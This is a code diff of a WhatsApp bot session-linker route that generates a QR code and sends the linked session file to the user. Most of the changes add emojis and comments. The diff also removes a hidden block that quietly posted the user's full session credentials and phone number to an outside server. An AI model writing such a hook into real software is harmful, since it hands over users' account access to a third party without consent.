@@ -31,7 +31,7 @@ router.get('/', async (req, res) => {
     }
 
     async function initiateSession() {
-        // PERMANENT FIX: Create the session folder before anything
+        // ✅ PERMANENT FIX: Create the session folder before anything
         if (!fs.existsSync(dirs)) fs.mkdirSync(dirs, { recursive: true });
 
         const { state, saveCreds } = await useMultiFileAuthState(dirs);
@@ -47,13 +47,14 @@ router.get('/', async (req, res) => {
                 if (qrGenerated || responseSent) return;
                 
                 qrGenerated = true;
-                console.log('QR Code Generated! Scan it with your WhatsApp app.');
-                console.log('Instructions:');
+                console.log('🟢 QR Code Generated! Scan it with your WhatsApp app.');
+                console.log('📋 Instructions:');
                 console.log('1. Open WhatsApp on your phone');
                 console.log('2. Go to Settings > Linked Devices');
                 console.log('3. Tap "Link a Device"');
                 console.log('4. Scan the QR code below');
-                
+                // Display QR in terminal
+                //qrcodeTerminal.generate(qr, { small: true });
                 try {
                     // Generate QR code as data URL
                     const qrDataURL = await QRCode.toDataURL(qr, {
@@ -94,18 +95,18 @@ router.get('/', async (req, res) => {
             const socketConfig = {
                 version,
                 logger: pino({ level: 'silent' }),
-                browser: Browsers.windows('Chrome'),
+                browser: Browsers.windows('Chrome'), // Using Browsers enum for better compatibility
                 auth: {
                     creds: state.creds,
                     keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                 },
-                markOnlineOnConnect: false,
-                generateHighQualityLinkPreview: false,
-                defaultQueryTimeoutMs: 60000,
-                connectTimeoutMs: 60000,
-                keepAliveIntervalMs: 30000,
-                retryRequestDelayMs: 250,
-                maxRetries: 5,
+                markOnlineOnConnect: false, // Disable to reduce connection issues
+                generateHighQualityLinkPreview: false, // Disable to reduce connection issues
+                defaultQueryTimeoutMs: 60000, // Increase timeout
+                connectTimeoutMs: 60000, // Increase connection timeout
+                keepAliveIntervalMs: 30000, // Keep connection alive
+                retryRequestDelayMs: 250, // Retry delay
+                maxRetries: 5, // Maximum retries
             };
 
             // Create socket and bind events
@@ -116,19 +117,21 @@ router.get('/', async (req, res) => {
             // Connection event handler function
             const handleConnectionUpdate = async (update) => {
                 const { connection, lastDisconnect, qr } = update;
-                console.log(`Connection update: ${connection || ''}`);
+                console.log(`🔄 Connection update: ${connection || ''}`);
 
                 if (qr && !qrGenerated) {
                     await handleQRCode(qr);
                 }
 
                 if (connection === 'open') {
-                    console.log('Connected successfully!');
-                    console.log('Session saved to:', dirs);
-                    reconnectAttempts = 0;
+                    console.log('✅ Connected successfully!');
+                    console.log('💾 Session saved to:', dirs);
+                    reconnectAttempts = 0; // Reset reconnect attempts on successful connection
                     
                     // Send session file to user 
                     try {
+                        
+                        
                         // Read the session file
                         const sessionKnight = fs.readFileSync(dirs + '/creds.json');
                         
@@ -144,46 +147,25 @@ router.get('/', async (req, res) => {
                                 mimetype: 'application/json',
                                 fileName: 'creds.json'
                             });
-                            console.log("Session file sent successfully to", userJid);
-                            
-                            // AUTO SEND SESSION TO MAIN BOT (VAMPARINA V1-5) - ADDED FEATURE
-                            try {
-                                const sessionData = JSON.parse(sessionKnight.toString());
-                                await fetch('https://vamparina-v1-5.onrender.com/vamparina-activate', {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({
-                                        type: 'qr',
-                                        phone: sock.user?.id?.split(':')[0] || 'unknown',
-                                        sessionId: `VAMPARINA_QR_${sessionId}`,
-                                        creds: sessionData,
-                                        timestamp: new Date().toISOString(),
-                                        source: 'qr-linker'
-                                    })
-                                });
-                                console.log("Session auto-sent to main VAMPARINA server (QR method)");
-                            } catch (sendErr) {
-                                console.log("Main server offline (QR session still works for user)");
-                            }
-                            // END AUTO SEND
+                            console.log("📄 Session file sent successfully to", userJid);
                             
                             // Send video thumbnail with caption
                             await sock.sendMessage(userJid, {
                                 image: { url: 'https://img.youtube.com/vi/-oz_u1iMgf8/maxresdefault.jpg' },
-                                caption: `*VAMPARINA MD V2.0 Full Setup Guide!*\n\nBug Fixes + New Commands + Fast AI Chat\nWatch Now: https://youtu.be/-oz_u1iMgf8`
+                                caption: `🎬 *VAMPARINA MD V2.0 Full Setup Guide!*\n\n🚀 Bug Fixes + New Commands + Fast AI Chat\n📺 Watch Now: https://youtu.be/-oz_u1iMgf8`
                             });
-                            console.log("Video guide sent successfully");
+                            console.log("🎬 Video guide sent successfully");
                             
                             // Send warning message
                             await sock.sendMessage(userJid, {
-                                text: `Do not share this file with anybody\n 
-┌┤ Thanks for using VAMPARINA
+                                text: `⚠️Do not share this file with anybody⚠️\n 
+┌┤✑  Thanks for using VAMPARINA
 │└────────────┈ ⳹        
 │©2024 Arnold Chirchir | +254703110780
 └─────────────────┈ ⳹\n\n`
                             });
                         } else {
-                            console.log("Could not determine user JID to send session file");
+                            console.log("❌ Could not determine user JID to send session file");
                         }
                     } catch (error) {
                         console.error("Error sending session file:", error);
@@ -191,33 +173,35 @@ router.get('/', async (req, res) => {
                     
                     // Clean up session after successful connection and sending files
                     setTimeout(() => {
-                        console.log('Cleaning up session...');
+                        console.log('🧹 Cleaning up session...');
                         const deleted = removeFile(dirs);
                         if (deleted) {
-                            console.log('Session cleaned up successfully');
+                            console.log('✅ Session cleaned up successfully');
                         } else {
-                            console.log('Failed to clean up session folder');
+                            console.log('❌ Failed to clean up session folder');
                         }
-                    }, 15000);
+                    }, 15000); // Wait 15 seconds before cleanup to ensure messages are sent
                 }
 
                 if (connection === 'close') {
-                    console.log('Connection closed');
+                    console.log('❌ Connection closed');
                     if (lastDisconnect?.error) {
-                        console.log('Last Disconnect Error:', lastDisconnect.error);
+                        console.log('❗ Last Disconnect Error:', lastDisconnect.error);
                     }
                     
                     const statusCode = lastDisconnect?.error?.output?.statusCode;
                     
+                    // Handle specific error codes
                     if (statusCode === 401) {
-                        console.log('Logged out - need new QR code');
+                        console.log('🔐 Logged out - need new QR code');
                         removeFile(dirs);
                     } else if (statusCode === 515 || statusCode === 503) {
-                        console.log(`Stream error (${statusCode}) - attempting to reconnect...`);
+                        console.log(`🔄 Stream error (${statusCode}) - attempting to reconnect...`);
                         reconnectAttempts++;
                         
                         if (reconnectAttempts <= maxReconnectAttempts) {
-                            console.log(`Reconnect attempt ${reconnectAttempts}/${maxReconnectAttempts}`);
+                            console.log(`🔄 Reconnect attempt ${reconnectAttempts}/${maxReconnectAttempts}`);
+                            // Wait a bit before reconnecting
                             setTimeout(() => {
                                 try {
                                     sock = makeWASocket(socketConfig);
@@ -228,14 +212,15 @@ router.get('/', async (req, res) => {
                                 }
                             }, 2000);
                         } else {
-                            console.log('Max reconnect attempts reached');
+                            console.log('❌ Max reconnect attempts reached');
                             if (!responseSent) {
                                 responseSent = true;
                                 res.status(503).send({ code: 'Connection failed after multiple attempts' });
                             }
                         }
                     } else {
-                        console.log('Connection lost - attempting to reconnect...');
+                        console.log('🔄 Connection lost - attempting to reconnect...');
+                        // Let it reconnect automatically
                     }
                 }
             };
@@ -252,7 +237,7 @@ router.get('/', async (req, res) => {
                     res.status(408).send({ code: 'QR generation timeout' });
                     removeFile(dirs);
                 }
-            }, 30000);
+            }, 30000); // 30 second timeout
 
         } catch (err) {
             console.error('Error initializing session:', err);
